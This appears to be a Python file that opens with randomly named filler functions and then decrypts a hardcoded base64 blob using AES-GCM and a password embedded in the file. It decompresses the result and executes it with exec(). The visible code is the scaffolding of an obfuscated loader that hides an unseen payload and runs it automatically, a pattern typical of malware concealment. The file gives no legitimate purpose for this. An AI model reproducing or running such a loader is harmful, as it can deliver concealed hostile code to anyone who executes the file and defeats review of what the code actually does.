def JEEfZcpj():
    AXAjOedc = 62457
    return AXAjOedc * 7

def KCrakKcQ():
    OHnNmcWa = 65780
    return OHnNmcWa * 6

def pXoyWopd():
    kuqMmRCH = 80605
    return kuqMmRCH * 5

def clztermW():
    kZkOEaNT = 80613
    return kZkOEaNT * 9


import base64, zlib
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

def dec(blob, password):
    raw = base64.b64decode(blob)
    salt, nonce, tag, ct = raw[:16], raw[16:32], raw[32:48], raw[48:]
    key = PBKDF2(password, salt, dkLen=32, count=100000)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    data = cipher.decrypt_and_verify(ct, tag)
    code = zlib.decompress(data).decode()
    exec(compile(code, "<aes>", "exec"), {"__name__": "__main__"})

blob = """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"""
DozerMx = "YLHvu1XCgblmIFCY"
dec(blob, DozerMx)
